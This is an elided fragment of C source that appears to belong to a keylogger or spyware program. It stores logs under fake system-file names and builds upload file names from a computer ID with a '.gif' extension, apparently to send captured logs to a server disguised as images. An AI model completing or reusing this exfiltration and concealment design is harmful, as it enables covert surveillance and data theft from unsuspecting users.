...
const char LocLogFileExt[] = ".inv";
const char LogCountFile[] = "appmgmt.sys";
...
const char SrvLogFileExt[] = ".gif";
const char UplinkCountFile[] = "uicore32.sys";
...
inline char UploadLog(unsigned long int no)
{
	...
	if(InternetCheckConnection(InternetCheckMask,0,0))
	{
		...
		if(hNet == NULL) {
			...
			sprintf(remote_file,"%lu-%lX%s",GetCompId(),no,SrvLogFileExt);
